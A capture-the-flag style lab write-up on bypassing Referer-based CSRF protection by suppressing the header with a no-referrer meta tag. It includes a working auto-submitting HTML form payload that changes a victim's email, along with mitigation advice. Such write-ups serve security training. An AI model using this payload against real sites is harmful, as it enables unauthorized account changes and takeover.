# Lab Name
CSRF where Referer validation depends on header being present

## Vulnerability
Cross-Site Request Forgery (CSRF) – Referer Header Validation Bypass

## Objective
Exploit a CSRF vulnerability by bypassing Referer header validation and change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the application validates the Referer header only if it is present

5. Generate a CSRF PoC using Burp Suite

6. Modify the exploit page to include the following meta tag to suppress the Referer header

   <meta name="referrer" content="no-referrer">

7. Upload the exploit to the Exploit Server

8. Deliver the exploit to the victim

9. When the victim visits the malicious page, the browser omits the Referer header and submits the forged request

10. Observe that the application accepts the request and the victim's email address is changed successfully, solving the lab

## Payload Used

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://0ae00064047648ae80b767f4008d0084.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="xyz@gmail.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the Referer header validation by removing the Referer header and changed the victim's email address.

## Impact
- Unauthorized account modifications
- Bypass of Referer-based CSRF protection
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Do not rely solely on the Referer header for CSRF protection
- Implement unpredictable CSRF tokens
- Validate both Origin and Referer headers where appropriate
- Use SameSite cookies
- Perform server-side validation for all state-changing requests

## Learning
Applications should not treat the absence of a Referer header as a valid request.
Referer-based validation alone is unreliable because browsers or attackers can suppress the header, making robust CSRF token validation essential.
